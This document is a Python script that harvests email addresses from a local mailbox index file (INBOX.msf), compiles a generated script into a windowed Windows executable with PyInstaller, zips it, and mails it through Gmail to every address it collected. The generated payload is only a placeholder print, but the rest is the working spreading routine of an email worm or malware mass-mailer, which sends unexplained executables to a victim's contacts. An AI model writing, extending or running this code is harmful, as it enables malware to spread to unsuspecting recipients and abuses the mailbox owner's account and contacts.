import os
import zipfile
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText  # Import MIMEText to handle text body properly
from email.mime.base import MIMEBase
from email import encoders
import subprocess

# Function to extract email addresses from a file
def extract_emails(file_path):
    emails = []
    with open(file_path, 'r') as file:
        lines = file.readlines()
        for line in lines:
            if '@' in line:
                emails.append(line.strip())
    return emails

# Step 1: Define the function to create a secondary script
def create_secondary_script(script_path):
    script_content = '''
# Automatically generated secondary script
def example_function():
    print("This is an example function in the secondary script.")
    
if __name__ == "__main__":
    example_function()
'''
    with open(script_path, 'w') as script_file:
        script_file.write(script_content)
    print(f"Secondary script created at {script_path}")

# Step 2: Convert Python script to executable using PyInstaller
def create_executable(script_path):
    command = f"pyinstaller --onefile --windowed {script_path}"
    subprocess.run(command, shell=True)

# Step 3: Zip the generated executable
def zip_executable(executable_path, zip_path):
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        zipf.write(executable_path, os.path.basename(executable_path))
    print(f"Executable zipped at {zip_path}")

# Step 4: Send email with the executable as an attachment
def send_email(sender_email, sender_password, recipient_emails, zip_path):
    subject = "Executable Attachment"
    body = "Please find the attached executable file."

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['Subject'] = subject

    # Correctly format the email body as MIMEText
    body_part = MIMEText(body, 'plain')  # Use MIMEText for plain text body
    msg.attach(body_part)

    # Attach the zip file
    with open(zip_path, 'rb') as attachment:
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f"attachment; filename={os.path.basename(zip_path)}")
        msg.attach(part)

    # Send the email
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(sender_email, sender_password)
        for recipient in recipient_emails:
            msg['To'] = recipient
            server.sendmail(sender_email, recipient, msg.as_string())
        server.quit()
        print("Email sent successfully!")
    except Exception as e:
        print(f"Error sending email: {e}")

# Main execution
if __name__ == "__main__":
    # 1. Extract emails from file
    email_file = 'INBOX.msf'  # Change to your file path containing emails
    recipient_emails = extract_emails(email_file)

    # 2. Generate secondary script
    script_path = 'generated_secondary_script.py'
    create_secondary_script(script_path)

    # 3. Create executable from the script
    create_executable(script_path)

    # 4. Zip the executable
    executable_path = 'dist\\generated_secondary_script.exe'  # Path of the generated executable
    zip_path = 'generated_executable.zip'
    zip_executable(executable_path, zip_path)

    # 5. Send email with the zip as an attachment
    sender_email = 'your@gmail.com'
    sender_password = 'app password for email'  # App password for Gmail
    send_email(sender_email, sender_password, recipient_emails, zip_path)
